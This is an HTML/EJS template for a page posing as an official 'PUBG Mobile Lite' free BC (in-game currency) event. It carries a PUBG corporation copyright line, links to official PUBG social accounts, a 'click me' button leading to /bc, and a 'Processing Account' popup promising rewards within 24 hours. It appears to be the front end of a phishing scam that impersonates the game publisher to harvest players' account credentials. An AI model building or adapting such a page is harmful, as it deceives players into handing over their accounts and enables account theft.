<main x-data="pubg">
  <% if(status.status){ if(status.status[0].status==='Success'){%>
  <div
    class="
      login_overlay
      fixed
      top-0
      left-0
      bottom-0
      right-0
      flex
      justify-center
      items-center
      h-screen
      w-full
      bg-black bg-opacity-30
      z-50
    "
  x-cloak x-show="$store.pubg_store.message"
  >
    <div
      class="
        message_modal
        mx-auto
        text-center
        relative
        bg-cover bg-center
        px-2
        pt-1.5
        pb-4
      "
      style="
        background-image: url('./img/popup.png');
        background-size: 100% 100%;
        width: 400px;
        position: relative;
        text-align: center;
      "
    >
      <div class="login_header">
        <h1
          class="
            md:text-md
            text-xs text-center
            md:mt-2
            sm:mt-2
            mt-4
            ml-6
            text-white
          "
        >
          Processing Account
        </h1>
      </div>
      <div class="login_body">
        <h1 class="text-md mt-3">
          Thank your for joining this
          <span class="uppercase">pubg mobile lite:</span> New BC event
        </h1>
        <p class="my-6 text-md">
          currently our account has been sucessfully processing<br />
          please wait upto 24 hours to receive your rewards
        </p>
      </div>
      <div class="login_footer">
        <form @submit.prevent="message_close">
          <button
            class="
              capitalize
              bg-yellow-500 bg-opacity-60
              py-1
              px-6
              mb-4
              mx-auto
              block
            "
          >
            <p class="text-lg opacity-100">okay</p>
          </button>
        </form>
      </div>
    </div>
  </div>
  <%} } %>
  <section
    class="
      min-h-screen
      bg-no-repeat bg-cover bg-center
      flex flex-col
      justify-center
      items-center
      relative
      z-40
    "
    style="background-image: url('./img/pc_kv1.jpg')"
  >
    <div class="flex flex-col text-center items-center w-11/12">
      <figure
        class="logo rounded-full w-20 h-20 overflow-hidden bg-center mb-6"
      >
        <img src="./img/lite-logo.png" alt="logo" />
      </figure>
      <h1 class="title capitalize font-semibold text-lg text-white">
        pubg mobile lite
      </h1>
      <p class="title capitalize font-semibold text-lg text-white">
        Find your bc now &copy; PUBG corporation
      </p>
      <div class="social flex justify-evenly items-center w-32 text-white my-4">
        <a
          target="_blank"
          href="https://www.facebook.com/PUBGMOBILE/"
          target="_blank"
          ><i class="fab fa-facebook-f text-2xl"></i
        ></a>
        <a
          target="_blank"
          href="https://twitter.com/PUBGMOBILE?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor"
          target="_blank"
          ><i class="fab fa-twitter text-2xl"></i
        ></a>
        <a
          target="_blank"
          href="https://www.youtube.com/PUBGMOBILE"
          target="_blank"
          ><i class="fab fa-youtube text-2xl"></i
        ></a>
      </div>
      <a
        href="/bc"
        class="
          rounded-full
          bg-blue-600
          py-2.5
          text-md
          flex
          items-center
          justify-center
          text-lg
          font-semibold
          md:w-56
          w-full
          px-3
          relative
        "
      >
        <figure
          class="
            logo
            rounded-full
            w-10
            h-10
            overflow-hidden
            bg-center
            absolute
            left-2.5
            bottom-1
          "
        >
          <img src="./img/download-removebg-preview.png" alt="" srcset="" />
        </figure>
        <h1 class="text-center capitalize ml-2.5">click me</h1>
      </a>
    </div>
  </section>
</main>
